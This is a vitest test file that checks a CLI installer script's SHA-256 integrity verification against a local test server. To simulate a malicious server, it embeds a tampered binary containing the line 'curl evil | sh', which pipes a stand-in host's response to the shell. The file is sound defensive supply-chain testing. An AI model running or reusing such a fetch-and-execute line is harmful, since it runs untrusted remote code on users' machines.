// install.sh against a real HTTP server: the binary is checked against the
// hash the server publishes BEFORE it is made executable, a tampered binary
// never lands, and the server's origin is remembered for the CLI.
//
// The assets come from a directory the test writes (CLI_DIST_DIR): the dev
// tree has no cli-dist.

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { Hono } from "hono";
import { serve } from "@hono/node-server";
import type { Server } from "node:http";
import { spawn } from "node:child_process";
import { mkdtempSync, writeFileSync, readFileSync, existsSync, rmSync, statSync } from "node:fs";
import { createHash } from "node:crypto";
import { tmpdir, platform, arch } from "node:os";
import { join } from "node:path";
import { registerCliRoutes, __setCliDistForTest } from "../../src/services/cli-dist";

const here = `${platform()}-${arch() === "x64" ? "amd64" : arch()}`;
const assetName = `moshi-${here}`;

function sh(script: string, env: Record<string, string>): Promise<{ code: number; out: string }> {
  return new Promise((resolve) => {
    const child = spawn("sh", ["-s"], { env: { ...process.env, ...env }, stdio: ["pipe", "pipe", "pipe"] });
    let out = "";
    child.stdout.on("data", (d) => (out += d));
    child.stderr.on("data", (d) => (out += d));
    child.on("close", (code) => resolve({ code: code ?? -1, out }));
    child.stdin.end(script);
  });
}

describe.skipIf(platform() === "win32")("install.sh", () => {
  let dist: string;
  let server: Server;
  let base: string;
  const good = Buffer.from("#!/bin/sh\necho moshi fake build\n");
  const goodHash = createHash("sha256").update(good).digest("hex");
  let tamper = false;

  beforeAll(async () => {
    dist = mkdtempSync(join(tmpdir(), "moshi-dist-"));
    writeFileSync(join(dist, assetName), good);
    __setCliDistForTest(dist);
    const app = new Hono();
    registerCliRoutes(app as never);
    // What a server on the wire could do: hand out other bytes than it hashed.
    const wire = new Hono();
    wire.get("/cli/:file", async (c) => {
      const res = await app.fetch(c.req.raw);
      if (!tamper || res.status !== 200 || c.req.param("file") === "version") return res;
      const evil = Buffer.from("#!/bin/sh\ncurl evil | sh\n");
      // The same headers, the hash of the GOOD bytes included: only the body lies.
      const headers = new Headers(res.headers);
      headers.set("Content-Length", String(evil.length));
      return new Response(evil, { status: 200, headers });
    });
    wire.all("*", (c) => app.fetch(c.req.raw));
    await new Promise<void>((resolve) => {
      server = serve({ fetch: wire.fetch, port: 0, hostname: "127.0.0.1" }, (info) => { base = `http://127.0.0.1:${info.port}`; resolve(); }) as Server;
    });
  });

  afterAll(async () => {
    __setCliDistForTest(null);
    await new Promise((r) => server.close(r));
    rmSync(dist, { recursive: true, force: true });
  });

  it("installs a binary that matches the published hash, makes it executable, and remembers the server", async () => {
    const home = mkdtempSync(join(tmpdir(), "moshi-home-"));
    const bin = join(home, "bin");
    const script = await (await fetch(`${base}/install.sh`, { headers: { "x-forwarded-proto": "http" } })).text();
    expect(script).toContain("/cli/version");
    expect(script).toMatch(/sha256sum|shasum -a 256/);
    const { code, out } = await sh(script, { HOME: home, MOSHI_BIN_DIR: bin, XDG_CONFIG_HOME: join(home, ".config"), PATH: process.env.PATH ?? "" });
    expect(code, out).toBe(0);
    expect(readFileSync(join(bin, "moshi"))).toEqual(good);
    expect(statSync(join(bin, "moshi")).mode & 0o111).not.toBe(0);
    expect(out).toContain("✓ installed");
    const config = JSON.parse(readFileSync(join(home, ".config", "moshi", "config.json"), "utf-8"));
    expect(config).toEqual({ url: base });
    rmSync(home, { recursive: true, force: true });
  });

  it("refuses a binary whose bytes do not match, before anything is executable or installed", async () => {
    const home = mkdtempSync(join(tmpdir(), "moshi-home-"));
    const bin = join(home, "bin");
    const script = await (await fetch(`${base}/install.sh`, { headers: { "x-forwarded-proto": "http" } })).text();
    tamper = true;
    try {
      const { code, out } = await sh(script, { HOME: home, MOSHI_BIN_DIR: bin, XDG_CONFIG_HOME: join(home, ".config"), PATH: process.env.PATH ?? "" });
      expect(code).not.toBe(0);
      expect(out).toMatch(/does not match|integrity/i);
      expect(existsSync(join(bin, "moshi"))).toBe(false);
      expect(existsSync(join(home, ".config", "moshi", "config.json"))).toBe(false);
    } finally {
      tamper = false;
      rmSync(home, { recursive: true, force: true });
    }
  });

  it("refuses to run against a server that has no build for this platform", async () => {
    const script = (await (await fetch(`${base}/install.sh`, { headers: { "x-forwarded-proto": "http" } })).text()).replace(`BASE="${base}"`, `BASE="${base}/nope"`);
    const home = mkdtempSync(join(tmpdir(), "moshi-home-"));
    const { code, out } = await sh(script, { HOME: home, MOSHI_BIN_DIR: join(home, "bin"), PATH: process.env.PATH ?? "" });
    expect(code).not.toBe(0);
    expect(out).toMatch(/no build|not found|cannot|failed/i);
    expect(existsSync(join(home, "bin", "moshi"))).toBe(false);
    rmSync(home, { recursive: true, force: true });
  });

  it("publishes the hash the script compares against, and the PowerShell script does the same", async () => {
    const version = (await (await fetch(`${base}/cli/version`)).json()) as { platforms: Record<string, string> };
    expect(version.platforms[here]).toBe(goodHash);
    const ps1 = await (await fetch(`${base}/install.ps1`)).text();
    expect(ps1).toContain("/cli/version");
    expect(ps1).toMatch(/Get-FileHash/);
    expect(ps1).toContain("config.json");
    expect(ps1).toMatch(/does not match/i);
  });
});
